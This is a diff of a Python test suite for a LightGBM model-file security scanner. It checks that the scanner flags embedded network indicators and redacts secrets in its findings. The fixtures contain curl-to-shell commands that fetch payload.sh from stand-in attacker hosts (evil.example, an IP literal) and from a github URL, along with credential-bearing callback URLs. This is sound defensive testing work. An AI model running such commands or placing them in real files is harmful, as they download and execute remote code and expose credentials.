@@ -269,14 +269,29 @@ def test_lightgbm_read_failure_takes_operational_precedence_over_security_findin
 
 def test_scan_redacts_urls_in_lightgbm_findings(tmp_path: Path) -> None:
     path = tmp_path / "network_secret.model"
+    hostname_secrets = [
+        "arbitrary-customer-secret-1234567890",
+        "sk-" + ("a" * 30),
+        "AIza" + ("a" * 35),
+        "hf_" + ("a" * 36),
+        "glpat-" + ("a" * 20),
+        "SG." + ("a" * 22) + "." + ("b" * 43),
+        "eyJ" + ("a" * 18) + ".eyJ" + ("b" * 28) + "." + ("c" * 18),
+    ]
+    benign_hostname = "sk-documentation-20260604.evil.example"
     path.write_text(
         _build_lightgbm_text(
             [
                 (
-                    "metadata=os.system('curl "
-                    "https://lgb_user:lgb_pass@collector.evil.example/payload.sh?token=LGB_SECRET#frag | sh')"
+                    "api_key=LGB_ADJACENT_SECRET Authorization: Bearer LGB_BEARER_SECRET "
+                    "metadata=os.system('curl LGB_STANDALONE_SECRET "
+                    "https://lgb_user:lgb_pass@collector.evil.example/"
+                    "LGB_PATH_SECRET/payload.sh?token=LGB_SECRET#frag | sh') "
                 ),
-                "callback_url=https://lgb_user:lgb_pass@collector.evil.example/payload.sh?token=LGB_SECRET#frag",
+                "callback_url=https://lgb_user:lgb_pass@collector.evil.example/"
+                + "LGB_PATH_SECRET/payload.sh?token=LGB_SECRET#frag",
+                *(f"callback_url=https://{secret}.evil.example/payload.sh" for secret in hostname_secrets),
+                f"callback_url=https://{benign_hostname}/model.txt",
             ]
         ),
         encoding="utf-8",
@@ -284,12 +299,114 @@ def test_scan_redacts_urls_in_lightgbm_findings(tmp_path: Path) -> None:
 
     result = LightGBMScanner().scan(str(path))
 
-    failed_details = " ".join(str(check.details) for check in result.checks if check.status == CheckStatus.FAILED)
-    assert "https://collector.evil.example/payload.sh" in failed_details
+    network_checks = _check_by_name(result, "Network Indicator Check")
+    assert len(network_checks) == 1
+    assert network_checks[0].details == {
+        "examples": (
+            [
+                {
+                    "line": str(line_number),
+                    "type": "url",
+                    "value_omitted": "model_text_may_contain_sensitive_literals",
+                }
+                for line_number in range(18, 21 + len(hostname_secrets))
+            ]
+        )
+    }
+
+    failed_details = " ".join(
+        str(check.details) for check in result.checks if check.status == CheckStatus.FAILED
+    ).lower()
     assert "lgb_user" not in failed_details
     assert "lgb_pass" not in failed_details
-    assert "LGB_SECRET" not in failed_details
+    assert "lgb_secret" not in failed_details
+    assert "lgb_path_secret" not in failed_details
+    assert "lgb_adjacent_secret" not in failed_details
+    assert "lgb_bearer_secret" not in failed_details
+    assert "lgb_standalone_secret" not in failed_details
+    assert all(secret.lower() not in failed_details for secret in hostname_secrets)
+    assert benign_hostname not in failed_details
+    assert "model_text_may_contain_sensitive_literals" in failed_details
+    assert "payload.sh" not in failed_details
     assert "#frag" not in failed_details
+
+
+def test_scan_correlates_command_with_trusted_download_url(tmp_path: Path) -> None:
+    path = tmp_path / "trusted_download.model"
+    path.write_text(
+        _build_lightgbm_text(
+            ["metadata=os.system('curl https://github.com/example/project/releases/payload.sh | sh')"]
+        ),
+        encoding="utf-8",
+    )
+
+    result = LightGBMScanner().scan(str(path))
+
+    network_checks = _check_by_name(result, "Network Indicator Check")
+    assert len(network_checks) == 1
+    assert network_checks[0].status == CheckStatus.FAILED
+    assert network_checks[0].details == {
+        "examples": [
+            {
+                "line": "18",
+                "type": "url",
+                "value_omitted": "model_text_may_contain_sensitive_literals",
+            }
+        ]
+    }
+    correlation_checks = _check_by_name(result, "Command/Network Correlation Check")
+    assert len(correlation_checks) == 1
+    assert correlation_checks[0].status == CheckStatus.FAILED
+    assert correlation_checks[0].severity == IssueSeverity.CRITICAL
+
+
+def test_scan_omits_ip_literal_network_values(tmp_path: Path) -> None:
+    path = tmp_path / "ip_literal.model"
+    path.write_text(
+        _build_lightgbm_text(
+            [
+                "metadata=os.system('curl https://8.8.8.8/payload.sh | sh')",
+                "callback_ip=1.1.1.1",
+            ]
+        ),
+        encoding="utf-8",
+    )
+
+    result = LightGBMScanner().scan(str(path))
+
+    network_checks = _check_by_name(result, "Network Indicator Check")
+    assert len(network_checks) == 1
+    assert network_checks[0].details == {
+        "examples": [
+            {
+                "line": "18",
+                "type": "url",
+                "value_omitted": "model_text_may_contain_sensitive_literals",
+            },
+            {
+                "line": "19",
+                "type": "public_ip",
+                "value_omitted": "model_text_may_contain_sensitive_literals",
+            },
+        ]
+    }
+    failed_details = " ".join(str(check.details) for check in result.checks if check.status == CheckStatus.FAILED)
+    assert "8.8.8.8" not in failed_details
+    assert "1.1.1.1" not in failed_details
+
+
+def test_scan_ignores_benign_trusted_reference_url(tmp_path: Path) -> None:
+    path = tmp_path / "trusted_reference.model"
+    path.write_text(
+        _build_lightgbm_text(["documentation=https://lightgbm.readthedocs.io/en/latest/"]),
+        encoding="utf-8",
+    )
+
+    result = LightGBMScanner().scan(str(path))
+
+    network_checks = _check_by_name(result, "Network Indicator Check")
+    assert len(network_checks) == 1
+    assert network_checks[0].status == CheckStatus.PASSED
 
 
 def test_scan_corrupt_file_fails_signature_validation(tmp_path: Path) -> None:
